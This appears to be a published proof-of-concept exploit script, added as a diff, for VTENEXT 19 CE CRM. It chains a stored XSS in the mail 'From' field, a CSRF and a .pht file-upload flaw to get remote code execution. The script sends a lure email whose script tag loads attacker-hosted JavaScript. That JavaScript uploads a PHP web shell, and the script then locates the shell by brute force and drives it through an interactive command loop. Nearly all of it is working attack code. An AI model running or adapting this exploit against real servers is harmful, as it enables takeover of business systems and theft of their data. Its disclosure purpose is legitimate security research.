@@ -1,0 +1,141 @@
+#!/usr/bin/python3
+
+# Exploit Title: VTENEXT 19 CE - Remote Code Execution
+# Google Dork: n/a
+# Date: 2020/09/09
+# Exploit Author: Marco Ruela
+# Vendor Homepage: https://www.vtenext.com/en/
+# Software Link: Vendor removed vulnerable version from sourceforge.net
+# Version: 19 CE
+# Tested on: Ubuntu 16.04
+# CVE 	: N/A
+	
+# 2020/03/07 - Disclosed vulnerabilities to vendor
+# 2020/03/10 - Vendor committed to fix
+# 2020/09/09 - Public disclosure
+
+# This script should be easy enough to follow.
+# We string together the three vulnerabilities to get RCE.
+
+# XSS - The "From" field of the VTENEXT Messages module is vulnerable.
+# File Upload - File extensions are checked against a $upload_badext in the config file, .pht extensions are allowed and executable by default .
+# CSRF - No CSRF protections in place.
+
+# exploit.js needs to be hosted somewhere, IP's need to be replaced 
+# check_csrf() should be changed based on your setup
+# run_shell() is a "nice to have"
+
+
+# content of exploit.js
+"""
+function insertImage() {
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST','http://192.168.226.168/vtenext19ce/index.php?module=Myfiles&action=MyfilesAjax&file=UploadFile&folderid=&uniqueid=',true);
+	xhr.setRequestHeader('Content-type','multipart/form-data; boundary=---------------------------rekt');
+    xhr.setRequestHeader('Content-Length', '248');
+    xhr.setRequestHeader('Referer', 'http://172.16.233.146/vtenext19ce/index.php');
+    xhr.withCredentials = true;
+    var body = '-----------------------------rekt\nContent-Disposition: form-data; name="file_0"; filename="shell.pht"\nContent-Type: text/text\n\n<?php system($_GET[\'x\']); ?>\n\n-----------------------------rekt--';
+    
+    var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+}
+
+insertImage();
+"""
+
+import smtplib
+import datetime
+import requests
+import os
+import time
+
+base_url = "http://192.168.226.168/vtenext19ce/"
+
+print("[*] CVE-2020-10227, CVE-2020-10228, CVE-2020-10229 - POC")
+
+
+def build_url():
+    d = datetime.datetime.today()
+    year = str(d.year)
+    month = str(d.strftime("%B"))
+    week = "week" + str(d.isocalendar()[1] - d.replace(day=1).isocalendar()[1])
+    tmp = base_url + "storage/home/1/" + year + "/" + month + "/" + week + "/"
+    return(tmp)
+
+def build_mail():
+    _from    = """'<script src="http://192.168.226.1/exploit.js" onerror=alert(1) >'"""
+    _to      = "admin@example.com"
+    _subject = "Important!"
+    _body    = "While you're reading this, a file is being uploaded to this server." 
+
+    msg  = "From: " + _from + "\n"
+    msg += "To: " + _to + "\n"
+    msg += "Subject: " + _subject + "\n\n"
+    msg += _body
+    return msg
+
+def send_mail():
+    msg = build_mail()
+    smtp_server = '192.168.226.167'
+    smtp_port   = 25
+
+    sender   = 'user1@lab.local'
+    receiver = 'admin@lab.local'
+
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.sendmail(sender, receiver, msg)
+
+def check_csrf():
+    while True:
+        is_there = os.popen('tail -n1 /var/log/apache2/access.log').read()
+
+        if "200" in is_there and "/exploit.js" in is_there and base_url in is_there:
+            print("[>] CSRF triggered")
+            break
+        else:
+            time.sleep(0.5)
+            continue
+
+
+def find_shell():
+    print("[>] Locating shell")
+    time.sleep(1)
+    tmp1 = build_url()
+    for i in range(1, 9999):
+        url = tmp1 + str(i) + "_shell.pht" 
+        r = requests.get(url)
+        if r.status_code == 200:
+            print("[>] Found the shell")
+            print("[-] Location: " + url)
+            return url
+        else:
+            continue    
+
+def run_shell(x):
+    print("\n")
+    while True:
+        cmd = input("shell> ")
+        if cmd == "exit":
+            break
+        else:
+            url = x + "?x=" + cmd
+            r = requests.get(url)
+            print(r.text)
+
+
+print("[>] Sending email")
+send_mail()
+
+print("[-] Waiting for user to open mail")
+
+check_csrf()
+
+shell_location = find_shell()
+
+run_shell(shell_location)
+
+
+print("[!] Done!")
